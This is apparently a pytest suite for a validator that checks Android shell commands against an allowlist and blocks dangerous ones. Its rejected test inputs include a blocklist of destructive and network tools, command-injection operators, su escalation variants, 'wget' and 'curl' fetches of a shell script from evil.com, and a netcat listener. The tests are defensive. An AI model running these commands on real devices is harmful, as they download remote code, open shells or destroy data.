"""Direct unit tests for validation.validate_command()."""

import pytest

from validation import validate_command


class TestValidateCommandLength:
    def test_empty_command_rejected(self):
        ok, reason = validate_command("")
        assert not ok
        assert "1-500" in reason

    def test_501_chars_rejected(self):
        ok, reason = validate_command("a" * 501)
        assert not ok
        assert "1-500" in reason


class TestValidateCommandDangerousChars:
    @pytest.mark.parametrize("ch", ["&&", "||", "|", ";", "`", "$(", ">", ">>", "<"])
    def test_dangerous_char_rejected(self, ch):
        ok, reason = validate_command(f"input tap 100 100 {ch} echo hax")
        assert not ok
        assert ch in reason or ch[0] in reason  # ">>" reports as ">"

    def test_newline_not_rejected(self):
        # newlines are not in _DANGEROUS_CHARS
        _ok, _reason = validate_command("input tap 100 100\ninput tap 200 200")
        # This would be split but not caught by dangerous chars


class TestValidateCommandDangerousExecutables:
    @pytest.mark.parametrize(
        "exe",
        [
            "reboot",
            "shutdown",
            "mount",
            "umount",
            "dd",
            "mkfs",
            "fdisk",
            "sfdisk",
            "Format",
            "del ",
            "rm -rf",
            "mv /",
            "cp /",
            "wget",
            "curl",
            "nc ",
            "ncat",
        ],
    )
    def test_dangerous_exec_rejected(self, exe):
        ok, reason = validate_command(exe)
        assert not ok
        exe_lower = exe.strip().lower()
        assert exe_lower in reason or exe_lower.split()[0] in reason

    def test_wget_with_url_rejected(self):
        ok, _reason = validate_command("wget http://evil.com/shell.sh")
        assert not ok

    def test_curl_with_url_rejected(self):
        ok, _reason = validate_command("curl http://evil.com/shell.sh")
        assert not ok

    def test_nc_with_options_rejected(self):
        ok, _reason = validate_command("nc -lvnp 4444")
        assert not ok

    def test_reboot_via_su_rejected(self):
        ok, _reason = validate_command("su root reboot")
        assert not ok

    def test_su_dash_c_pattern_rejected(self):
        ok, _reason = validate_command("su -c reboot")
        assert not ok

    def test_su_with_dangerous_exec_rejected(self):
        ok, _reason = validate_command("su superuser wget http://x.com")
        assert not ok

    def test_whitespace_variant_rejected(self):
        ok, _reason = validate_command("  reboot  ")
        assert not ok

    def test_cat_command_rejected(self):
        ok, _reason = validate_command("cat /sdcard/test.txt")
        assert not ok

    def test_mount_su_variant_rejected(self):
        """su with mount via different spacing patterns should be caught."""
        ok, _reason = validate_command("su root mount /system")
        assert not ok

    def test_su_with_quoted_args_rejected(self):
        """su with quoted arguments containing dangerous exec should be caught."""
        ok, _reason = validate_command('su -c "reboot"')
        assert not ok


class TestValidateCommandAllowedPrefixes:
    @pytest.mark.parametrize(
        "cmd",
        [
            "input text hello",
            "input keyevent 3",
            "input tap 500 500",
            "input swipe 100 100 200 200 500",
            "input press",
            "input roll dx 0 dy 100",
            "input drag 100 100 200 200 300",
            "input mouse",
            "pm list packages",
            "pm path com.example",
            "pm dump com.example",
            "pm install /sdcard/app.apk",
            "pm uninstall com.example",
            "pm clear com.example",
            "am start -n com.example/.MainActivity",
            "am force-stop com.example",
            "am kill com.example",
            "am broadcast",
            "am monitor",
            "am stack",
            "screencap -p",
            "screenrecord",
            "dumpsys activity",
            "dump",
            "settings get secure default_input_method",
            "getprop ro.build.version.sdk",
            "wm size",
            "ls /sdcard",
            "mkdir /sdcard/testdir",
            "touch /sdcard/test.txt",
            "netstat -an",
            "ip addr show",
            "ps -A",
            "top -n 1",
            "free",
            "df -h",
            "du -sh /sdcard",
            "getevent",
            "uiautomator dump",
            "monkey",
            "id",
            "uname -a",
            "whoami",
            "getconf",
            "date",
            "pwd",
            "echo hello",
        ],
    )
    def test_allowed_commands_accepted(self, cmd):
        ok, reason = validate_command(cmd)
        assert ok, f"Expected {cmd!r} to be allowed but got: {reason}"
        assert reason == "allowed"


class TestValidateCommandSafeShortCommands:
    @pytest.mark.parametrize("cmd", ["ls", "ps", "pwd", "date", "echo", "id", "uname", "whoami", "getconf", "uptime"])
    def test_safe_short_commands_accepted(self, cmd):
        ok, reason = validate_command(cmd)
        assert ok
        assert reason == "allowed"

    def test_case_insensitive_short_command(self):
        ok, _reason = validate_command("ECHO")
        assert ok

    def test_mixed_case_short_command(self):
        ok, _reason = validate_command("Ls")
        assert ok

    def test_command_with_args_not_matched_as_short_command(self):
        # "ls -la" is not in _SAFE_SHORT_COMMANDS but should pass via prefix
        ok, _reason = validate_command("ls -la")
        assert ok


class TestValidateCommandRejection:
    def test_unknown_command_rejected(self):
        ok, reason = validate_command("someunknowncmd")
        assert not ok
        assert "not in the allowlist" in reason

    def test_unknown_command_with_args_rejected(self):
        ok, _reason = validate_command("someunknowncmd --flag arg")
        assert not ok

    def test_return_tuple_structure(self):
        result = validate_command("input tap 100 100")
        assert isinstance(result, tuple)
        assert len(result) == 2
        assert isinstance(result[0], bool)
        assert isinstance(result[1], str)
